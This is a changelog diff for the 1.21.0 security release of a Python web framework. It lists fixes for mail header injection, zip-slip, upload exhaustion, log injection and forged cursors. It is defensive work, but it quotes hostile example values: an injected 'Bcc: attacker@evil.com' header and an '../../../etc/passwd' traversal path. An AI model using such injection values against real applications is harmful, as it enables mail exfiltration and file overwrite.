@@ -4,6 +4,47 @@ All notable changes to Nori are documented here. Format follows [Keep a Changelo
 
 ---
 
+## [1.21.0] — 2026-04-30
+
+### Upgrade notes — read first
+
+This release closes Round 7 of the deep audit — a fresh sweep across auth, HTTP edge, stateful core, persistence, bootstrap/CLI, and service drivers. Four HIGH security findings, six MEDIUM hardening items, five LOW (docs + defaults). All findings were verified by reading the actual code; the agent reports flagged a number of false positives (Jinja XSS via `old()`, OAuth state replay, httpx auth header logging) which are not bugs and are NOT changed here.
+
+**1. Email header injection is now refused.** `core.mail._build_message()` rejects CR/LF in `subject`, `from`, and any recipient. Pre-1.21.0, code that passed user input through to `subject` or `to` could allow an attacker to inject `\r\nBcc: attacker@evil.com` and exfiltrate mail. The new behavior raises `ValueError('Header injection attempt: ...')` instead of silently building a multi-header MIME message. Existing code that passes well-formed addresses and subjects is unaffected.
+
+**2. Uploads are streamed in 64KB chunks.** `save_upload()` no longer calls `await file.read()` (which loads the entire body before checking the size). Instead it pulls 64KB at a time and aborts as soon as the running total crosses `max_size`. A 10GB upload now allocates ~64KB before refusal instead of ~10GB. When `UploadFile.size` is already populated and exceeds the limit, the read is skipped entirely.
+
+**3. Zip extraction (installer + `framework:update`) refuses path traversal.** Both code paths now resolve every member's destination and assert it stays inside the extract directory. A compromised release archive containing `nori-vX.Y.Z/../../../etc/passwd` is rejected with a clear error before any byte is written.
+
+**4. `@cache_response` accepts an optional `key_fn` for per-user / per-tenant scoping.** The default cache key shape is unchanged (URL path + query) — appropriate for anonymous endpoints. For authenticated routes, pass `key_fn=lambda r: f'u={r.session.get("user_id")}'` to inject the auth context into the cache key and prevent cross-user response bleed. Existing decorated endpoints keep their previous cache keys, so cached entries survive the upgrade.
+
+### Fixed
+
+- **Mail header injection (HIGH).** `core/mail.py:_reject_header_injection` rejects CR/LF in `subject`, `from`, and recipients before assignment to MIME headers. Python's `email.message.Message.__setitem__` does not sanitize newlines, so unsanitized user input was a direct injection path.
+- **Upload OOM via `await file.read()` (HIGH).** `core/http/upload.py` reads the body in 64KB chunks via the new `_read_capped()` helper, aborting as soon as `max_size` is exceeded. Also short-circuits on `UploadFile.size` when the declared size already exceeds the limit.
+- **Zip-slip in `framework:update` (HIGH).** `core/cli.py:_safe_extract_path` resolves every relative path against the extract directory and refuses any member that escapes via `..`. A regression test (`test_framework_update_refuses_zip_slip_member`) packs a malicious member and asserts `framework:update` raises rather than writing to disk.
+- **Zip-slip in the installer (HIGH).** `docs/install.py:_safe_extract` replaces the old `zf.extractall(extract_dir)` call with a member-by-member walk that validates every destination path. The old code relied on Python ≥3.12's opt-in `filter='data'` argument which was never set.
+- **Request-ID log injection (MEDIUM).** `core/http/request_id.py` now validates incoming `X-Request-ID` against `^[A-Za-z0-9_\-]{1,64}$` before adopting it. CR/LF or oversized values are silently dropped and a fresh UUID4 is generated, so a forged header can't introduce fake log lines downstream.
+- **`regex:` validation rule capped at 4KB input (MEDIUM).** `core/http/validation.py:_REGEX_MAX_INPUT` bounds the worst-case ReDoS exposure. The pattern itself is developer-controlled (declared in the rules dict, never user-supplied), but a vulnerable pattern paired with a multi-megabyte input was the classic trigger; oversized inputs now fail the rule fast.
+- **`@cache_response` key namespacing (MEDIUM).** New optional `key_fn` parameter lets developers scope cached responses by user / tenant / role. The default behavior is unchanged for backward compatibility — see the upgrade notes for when to use `key_fn`.
+- **`nullable` no longer hides whitespace from other rules (MEDIUM).** Pre-1.21.0, `validate({'email': '   '}, {'email': 'nullable|email'})` returned no errors because `nullable` matched on whitespace-only strings. Now `nullable` triggers only when the field is missing, `None`, or an empty string — matching its docstring intent.
+- **WebSocket message size cap (MEDIUM).** Both `WebSocketHandler` and `JsonWebSocketHandler` enforce `max_message_size` (default 1 MiB) on every received frame; oversized frames close the connection with code 1009 ("message too big" per RFC 6455). Subclasses can override by setting the class attribute. `JsonWebSocketHandler` now caps the raw text frame *before* `json.loads` runs, so a malicious payload can't allocate a giant parsed structure first.
+- **Pagination cursors are now signed (MEDIUM).** `_encode_cursor` appends a 16-byte HMAC-SHA256 tag (truncated to 128 bits, signed with `SECRET_KEY`); `_decode_cursor` uses `hmac.compare_digest` to verify. A client can no longer forge a cursor pointing at an arbitrary timestamp / id to skip rows or trigger expensive range scans. Tokens issued before 1.21.0 will fail signature verification — surface a 400 and re-paginate from page 1 if you were caching cursors client-side.
+- **`queue:work --name` argument escaping (LOW).** `core/cli.py:queue_work` uses `json.dumps(name)` when interpolating the queue name into the inline subprocess script. This is a CLI-only command (no remote attack surface), but the previous `f"queue_name='{name}'"` would let a hostile invocation inject arbitrary Python — closing it on principle.
+- **Stable default ordering on `Role` and `Permission` (LOW).** Added `ordering = ['id']` to both `Meta` classes so `paginate_cursor()` over those tables yields contiguous, non-overlapping windows. Without the explicit ordering, Tortoise inherits the DB's natural row order which is unstable across pages.
+- **Jinja autoescape pinned explicitly (LOW).** `core/jinja.py` sets `env.autoescape = select_autoescape(...)` rather than relying on Starlette's default. If Starlette ever changes its default in a future release, we don't silently lose XSS protection on `.html` / `.xml` templates.
+
+### Documentation
+
+- `core/ws.py` — class docstring now warns explicitly that the base `on_connect()` accepts ALL clients without authentication, and documents the override pattern (validate session, then `await websocket.accept()`).
+- `models/framework/audit_log.py` — module docstring documents retention via `nori.py audit:purge --days N`.
+
+### Tests
+
+- 18 new tests covering the fixes above: CR/LF in mail, upload chunked-read abort + declared-size fast-path, zip-slip refusal in installer + framework_update, request_id CR/LF rejection, regex input cap, `cache_response` per-user isolation, nullable whitespace semantics, WebSocket oversize close, cursor tampering / forgery / wrong-secret rejection, queue_work hostile name escaping. Suite goes from 868 → 886 passing.
+
+---
+
 ## [1.20.3] — 2026-04-30
 
 ### Tests
